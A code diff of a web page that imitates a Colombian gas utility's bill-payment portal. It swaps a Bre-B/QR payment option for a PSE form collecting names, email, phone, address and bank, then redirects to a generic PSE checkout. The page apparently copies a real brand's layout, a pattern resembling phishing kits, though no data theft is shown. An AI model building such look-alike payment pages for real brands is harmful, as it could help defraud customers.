@@ -25,7 +25,6 @@
             padding: 0;
         }
 
-        /* Barra superior escritorio */
         .global-top-bar {
             background: #0d3859;
             color: #ffffff;
@@ -80,7 +79,6 @@
             cursor: pointer;
         }
 
-        /* Header móvil oculto por defecto en escritorio */
         .mobile-header-bar {
             display: none;
             background: var(--vanti-blue);
@@ -108,7 +106,6 @@
             background: #ffffff;
         }
 
-        /* CORRECCIÓN: Tamaño controlado del logo para escritorio */
         .header-container img {
             max-width: 190px;
             height: auto;
@@ -171,7 +168,7 @@
             cursor: pointer;
         }
 
-        select, input[type="text"] {
+        select, input[type="text"], input[type="email"], input[type="tel"] {
             width: 100%;
             padding: 10px 14px;
             height: 44px;
@@ -184,7 +181,7 @@
             box-sizing: border-box;
         }
 
-        select:focus, input[type="text"]:focus {
+        select:focus, input:focus {
             outline: none;
             border-color: var(--vanti-blue);
         }
@@ -206,8 +203,8 @@
 
         .payment-method-card {
             flex: 0 1 180px;
-            border: 1px solid #edf1f5;
-            background: #ffffff;
+            border: 2px solid var(--vanti-blue);
+            background: #f8fafc;
             border-radius: 11px;
             padding: 16px 12px;
             text-align: center;
@@ -216,22 +213,14 @@
         }
 
         .payment-method-icon {
-            height: 36px;
-            margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .payment-method-icon img {
-            max-height: 80px;
-            width: auto;
-            object-fit: contain;
+            font-size: 28px;
+            color: var(--vanti-blue);
+            margin-bottom: 4px;
         }
 
         .payment-method-card h5 {
-            margin: 0 0 6px 0;
-            font-size: 15px;
+            margin: 0 0 4px 0;
+            font-size: 16px;
             color: var(--vanti-blue);
             font-weight: 700;
         }
@@ -258,6 +247,15 @@
 
         .btn-consultar-azul:hover {
             background: #4a5c6b;
+        }
+
+        #seccion-pago-pse {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: #fdfdfd;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
         }
 
         .right-sidebar-box {
@@ -370,36 +368,18 @@
             background: var(--vanti-blue); color: #fff; border: none; padding: 10px 24px; margin-top: 20px; border-radius: 6px; cursor: pointer;
         }
 
-        /* MEDIA QUERIES PARA ADAPTACIÓN MÓVIL EXACTA A LA REFERENCIA */
         @media (max-width: 900px) {
-            .global-top-bar { display: none; } /* Oculta barra superior PC en mobile */
-            .mobile-header-bar { display: flex; } /* Muestra barra con menú hamburguesa */
-            
-            .header-container { 
-                padding: 20px 16px 10px; 
-                justify-content: center;
-            }
-            .header-container img {
-                max-width: 140px !important; /* Tamaño del logo ajustado para móvil */
-            }
-
-            .main-wrapper { 
-                grid-template-columns: 1fr; 
-                max-width: 100%; 
-                padding: 0 16px; 
-                margin: 10px auto 30px;
-                gap: 16px;
-            }
-
-            .right-sidebar-box { 
-                display: block !important; 
-            }
+            .global-top-bar { display: none; }
+            .mobile-header-bar { display: flex; }
+            .header-container { padding: 20px 16px 10px; justify-content: center; }
+            .header-container img { max-width: 140px !important; }
+            .main-wrapper { grid-template-columns: 1fr; max-width: 100%; padding: 0 16px; margin: 10px auto 30px; gap: 16px; }
+            .right-sidebar-box { display: block !important; }
         }
     </style>
 </head>
 <body>
 
-    <!-- Barra superior escritorio -->
     <div class="global-top-bar">
         <div class="global-nav-links">
             <span>Hogares</span>
@@ -414,7 +394,6 @@
         </div>
     </div>
 
-    <!-- Barra superior móvil -->
     <div class="mobile-header-bar">
         <button class="mobile-hamburger">&#9776;</button>
     </div>
@@ -457,26 +436,109 @@
                             <input type="text" name="referencia" placeholder="" required>
                         </div>
 
-                        <div class="payment-section-title">Selecciona el medio pago</div>
+                        <div class="payment-section-title">Medio de pago disponible</div>
 
-                        <!-- ÚNICO MÉTODO DE PAGO: BRE-B -->
                         <div class="payment-options-row">
-                            <div class="payment-method-card" style="flex: 1; max-width: 240px;">
+                            <div class="payment-method-card" style="flex: 1; max-width: 100%;">
                                 <div class="payment-method-icon">
-                                    <img src="/static/img/bre-b.jpg" alt="Logo Bre-B">
+                                    <i class="bi bi-shield-check"></i>
                                 </div>
-                                <h5>Pago Bre-B / QR</h5>
-                                <p>Paga de forma inmediata con tu llave o código QR interoperable.</p>
+                                <h5>Pago Seguros en Línea (PSE)</h5>
+                                <p>Paga de forma rápida y segura desde tu cuenta de ahorros o corriente.</p>
                             </div>
                         </div>
 
                         <button type="submit" id="btn-consultar" class="btn-consultar-azul">Consultar</button>
+
+                        <!-- FORMULARIO PSE CON LA LISTA COMPLETA DE BANCOS -->
+                        <div id="seccion-pago-pse">
+                            <h3 style="color: var(--vanti-blue); margin-top: 0; font-size: 18px;">💳 Completar Datos de Pago (PSE)</h3>
+                            <p style="margin-bottom: 15px; font-weight: 500;">Monto a pagar: <span id="monto-mostrar" style="color: #16a34a; font-size: 20px;">$0</span></p>
+
+                            <div class="field-group" style="margin-bottom: 12px;">
+                                <label class="field-label" style="font-size: 14px;">Nombres:</label>
+                                <input type="text" id="pse-nombres" placeholder="Tus nombres">
+                            </div>
+                            <div class="field-group" style="margin-bottom: 12px;">
+                                <label class="field-label" style="font-size: 14px;">Apellidos:</label>
+                                <input type="text" id="pse-apellidos" placeholder="Tus apellidos">
+                            </div>
+                            <div class="field-group" style="margin-bottom: 12px;">
+                                <label class="field-label" style="font-size: 14px;">Correo Electrónico:</label>
+                                <input type="email" id="pse-correo" placeholder="correo@ejemplo.com">
+                            </div>
+                            <div class="field-group" style="margin-bottom: 12px;">
+                                <label class="field-label" style="font-size: 14px;">Número de Celular:</label>
+                                <input type="tel" id="pse-celular" placeholder="3001234567">
+                            </div>
+                            <div class="field-group" style="margin-bottom: 12px;">
+                                <label class="field-label" style="font-size: 14px;">Dirección:</label>
+                                <input type="text" id="pse-direccion" placeholder="Calle 123 # 45-67">
+                            </div>
+                            
+                            <div class="field-group" style="margin-bottom: 16px;">
+                                <label class="field-label" style="font-size: 14px;">Seleccione su Banco:</label>
+                                <select id="banco" class="error-input">
+                                    <option value="">Elije el banco</option>
+                                    <option value="ALIANZA FIDUCIARIA">ALIANZA FIDUCIARIA</option>
+                                    <option value="BAN100">BAN100</option>
+                                    <option value="BANCAMIA S.A.">BANCAMIA S.A.</option>
+                                    <option value="BANCO AGRARIO">BANCO AGRARIO</option>
+                                    <option value="BANCO AV VILLAS">BANCO AV VILLAS</option>
+                                    <option value="BANCO BBVA COLOMBIA S.A.">BANCO BBVA COLOMBIA S.A.</option>
+                                    <option value="BANCO CAJA SOCIAL">BANCO CAJA SOCIAL</option>
+                                    <option value="BANCO COOPERATIVO COOPCENTRAL">BANCO COOPERATIVO COOPCENTRAL</option>
+                                    <option value="BANCO DAVIVIENDA">BANCO DAVIVIENDA</option>
+                                    <option value="BANCO DE BOGOTA">BANCO DE BOGOTA</option>
+                                    <option value="BANCO DE OCCIDENTE">BANCO DE OCCIDENTE</option>
+                                    <option value="BANCO FALABELLA">BANCO FALABELLA</option>
+                                    <option value="BANCO FINANDINA S.A. BIC">BANCO FINANDINA S.A. BIC</option>
+                                    <option value="BANCO GNB SUDAMERIS">BANCO GNB SUDAMERIS</option>
+                                    <option value="BANCO ITAU">BANCO ITAU</option>
+                                    <option value="BANCO J.P. MORGAN COLOMBIA S.A.">BANCO J.P. MORGAN COLOMBIA S.A.</option>
+                                    <option value="BANCO MUNDO MUJER S.A.">BANCO MUNDO MUJER S.A.</option>
+                                    <option value="BANCO PICHINCHA S.A.">BANCO PICHINCHA S.A.</option>
+                                    <option value="BANCO POPULAR">BANCO POPULAR</option>
+                                    <option value="BANCO SANTANDER COLOMBIA">BANCO SANTANDER COLOMBIA</option>
+                                    <option value="BANCO SERFINANZA">BANCO SERFINANZA</option>
+                                    <option value="BANCO UNION antes GIROS">BANCO UNION antes GIROS</option>
+                                    <option value="BANCOLOMBIA">BANCOLOMBIA</option>
+                                    <option value="BANCOOMEVA S.A.">BANCOOMEVA S.A.</option>
+                                    <option value="BOLD CF">BOLD CF</option>
+                                    <option value="CFA COOPERATIVA FINANCIERA">CFA COOPERATIVA FINANCIERA</option>
+                                    <option value="CITIBANK">CITIBANK</option>
+                                    <option value="COINK SA">COINK SA</option>
+                                    <option value="COLTEFINANCIERA">COLTEFINANCIERA</option>
+                                    <option value="CONFIAR COOPERATIVA FINANICERA">CONFIAR COOPERATIVA FINANICERA</option>
+                                    <option value="COTRAFA">COTRAFA</option>
+                                    <option value="CREZCAMOS">CREZCAMOS</option>
+                                    <option value="DALE">DALE</option>
+                                    <option value="DAVIPLATA">DAVIPLATA</option>
+                                    <option value="DING">DING</option>
+                                    <option value="FINANCIERA JURISCOOP SA">FINANCIERA JURISCOOP SA</option>
+                                    <option value="GLOBAL 66">GLOBAL 66</option>
+                                    <option value="IRIS">IRIS</option>
+                                    <option value="JFK COOPERATIVA FINANICERA">JFK COOPERATIVA FINANICERA</option>
+                                    <option value="LULO BANK">LULO BANK</option>
+                                    <option value="MOVII S.A">MOVII S.A</option>
+                                    <option value="NU">NU</option>
+                                    <option value="POWWI">POWWI</option>
+                                    <option value="RAPPIPAY">RAPPIPAY</option>
+                                    <option value="DAVIBANK">DAVIBANK</option>
+                                    <option value="UALÁ">UALÁ</option>
+                                </select>
+                            </div>
+
+                            <button type="button" onclick="procesarRedireccionPSE()" class="btn-consultar-azul" style="background: #16a34a;">
+                                Ir a Pagar por PSE 🚀
+                            </button>
+                        </div>
+
                     </div>
                 </div>
             </form>
         </div>
 
-        <!-- Bloque inferior de bancos -->
         <div class="right-sidebar-box">
             <div class="sidebar-header-row">
                 <div class="sidebar-check-icon">✓</div>
@@ -525,6 +587,23 @@
     <script>
         function mostrarCargando() {
             document.getElementById('loading-overlay').style.display = 'flex';
+        }
+
+        function procesarRedireccionPSE() {
+            const nombres = document.getElementById("pse-nombres").value;
+            const apellidos = document.getElementById("pse-apellidos").value;
+            const correo = document.getElementById("pse-correo").value;
+            const celular = document.getElementById("pse-celular").value;
+            const direccion = document.getElementById("pse-direccion").value;
+            const banco = document.getElementById("banco").value;
+
+            if (!nombres || !apellidos || !correo || !celular || !direccion || !banco) {
+                alert("Por favor completa todos los campos de información personal y selecciona tu banco.");
+                return;
+            }
+
+            console.log(`Redirigiendo a pasarela para el banco: ${banco}...`);
+            window.location.href = "https://checkout.pse.com.co/";
         }
     </script>
 </body>
